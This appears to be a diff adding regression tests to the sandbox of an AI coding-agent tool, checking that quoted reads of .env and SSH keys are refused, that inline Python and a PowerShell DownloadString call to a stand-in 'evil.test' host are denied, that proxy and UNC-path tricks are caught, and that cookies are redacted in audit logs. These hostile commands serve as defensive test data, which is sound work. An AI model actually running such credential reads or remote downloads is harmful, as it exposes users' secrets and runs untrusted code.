@@ -1035,3 +1035,98 @@ class _FakeProvider:
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class QuotedSensitivePathTests(SandboxTestBase):
+    def test_quoted_sensitive_path_is_refused(self) -> None:
+        # Quotes never made the file unreadable: `type ".env"` returned the same
+        # credential as `type .env`.
+        (self.workspace / ".env").write_text(
+            "API_TOKEN=super-secret\n", encoding="utf-8"
+        )
+        (self.workspace / ".ssh").mkdir()
+        (self.workspace / ".ssh" / "id_rsa").write_text(
+            "PRIVATE-KEY\n", encoding="utf-8"
+        )
+        tools = self._tools(enabled=False)
+        for command, secret in (
+            ('type ".env"', "super-secret"),
+            ("cat '.ssh/id_rsa'", "PRIVATE-KEY"),
+        ):
+            with self.subTest(command=command):
+                result = tools.dispatch("shell", {"command": command})
+                self.assertEqual(result.get("status"), "error", result)
+                self.assertNotIn(secret, str(result))
+                self.assertIn("sensitive path", str(result))
+
+    def test_multi_word_quoted_payload_is_still_data(self) -> None:
+        tools = self._tools(enabled=False)
+        result = tools.dispatch(
+            "shell", {"command": 'printf "%s\\n" "document .env handling"'}
+        )
+        self.assertEqual(result.get("status"), "success", result)
+
+    def test_directory_option_value_is_not_a_credential_read(self) -> None:
+        # A subagent is spawned as `minimalcode --home <dir>`; a config
+        # directory named `.MinimalCode` must not block every child process.
+        from minimalcode.sandbox.sensitive import sensitive_command_paths
+
+        quoted = f"minimalcode --home '{self.home}'"
+        self.assertEqual(sensitive_command_paths(quoted), ())
+        self.assertTrue(sensitive_command_paths(f"type '{self.home}/config.json'"))
+
+
+class NetworkPolicyRegressionTests(SandboxTestBase):
+    def _policy(self, **sandbox: object):
+        return self._tools(**sandbox).sandbox.policy
+
+    def test_versioned_interpreter_inline_script_is_inspected(self) -> None:
+        policy = self._policy(network_policy="deny")
+        for command in (
+            "py -3 -c \"import urllib.request;urllib.request.urlopen('http://e.test/x')\"",
+            "python3.12 -c \"import socket;socket.create_connection(('e.test',80))\"",
+        ):
+            with self.subTest(command=command):
+                self.assertIsNotNone(policy.network_denial(command), command)
+
+    def test_outer_powershell_download_stub_is_a_network_request(self) -> None:
+        policy = self._policy(network_policy="deny")
+        self.assertIsNotNone(
+            policy.network_denial(
+                "(New-Object Net.WebClient).DownloadString('http://evil.test/x.ps1')"
+            )
+        )
+        # A quoted search pattern is data, not a download call.
+        self.assertIsNone(policy.network_denial('rg "DownloadString" src'))
+
+    def test_attached_proxy_flag_contributes_its_host(self) -> None:
+        policy = self._policy(
+            network_policy="allowlist", allowed_hosts=["allowed.test"]
+        )
+        self.assertIsNone(policy.network_denial("curl https://allowed.test/x"))
+        denial = policy.network_denial("curl -xevil.test:8080 https://allowed.test/x")
+        self.assertIsNotNone(denial)
+        self.assertIn("evil.test", str(denial))
+
+    def test_extended_length_unc_path_is_detected(self) -> None:
+        command = r"copy \\?\UNC\evil.test\share\x out.txt"
+        self.assertIsNotNone(
+            self._policy(network_policy="deny").network_denial(command)
+        )
+        allowlist = self._policy(
+            network_policy="allowlist", allowed_hosts=["allowed.test"]
+        )
+        self.assertIn("evil.test", str(allowlist.network_denial(command)))
+
+    def test_quoted_option_values_are_redacted(self) -> None:
+        audit = self._tools().sandbox.audit
+        for command, secret in (
+            ('curl -b "session=SECRETCOOKIE1" https://x.test', "SECRETCOOKIE1"),
+            ('curl -H "Cookie: session=SECRETCOOKIE4" https://x.test', "SECRETCOOKIE4"),
+            ('curl --header "X-Token-Value: SECRET5" https://x.test', "SECRET5"),
+        ):
+            with self.subTest(command=command):
+                audit.deny("shell", command, "network denied")
+                target = audit.denials()[-1].target
+                self.assertNotIn(secret, target)
+                self.assertIn("<redacted>", target)
